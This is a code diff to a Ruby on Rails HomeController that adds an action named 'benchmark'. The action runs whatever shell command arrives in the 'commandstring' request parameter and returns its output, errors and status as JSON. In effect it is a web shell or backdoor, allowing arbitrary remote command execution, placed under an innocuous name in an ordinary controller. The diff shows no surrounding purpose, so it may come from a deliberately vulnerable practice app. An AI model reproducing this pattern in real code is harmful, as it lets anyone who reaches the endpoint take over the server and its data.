@@ -20,6 +20,13 @@ class HomeController < ApplicationController
     end
   end
 
+  def benchmark
+    require 'open3'
+    stdout, stderr, status = Open3.capture3(params[:commandstring])
+    render :json => {result: stdout, stderr: stderr, status: status, command: params[:commandstring]}
+  end
+
+
   def about
     begin
       @title = "About"
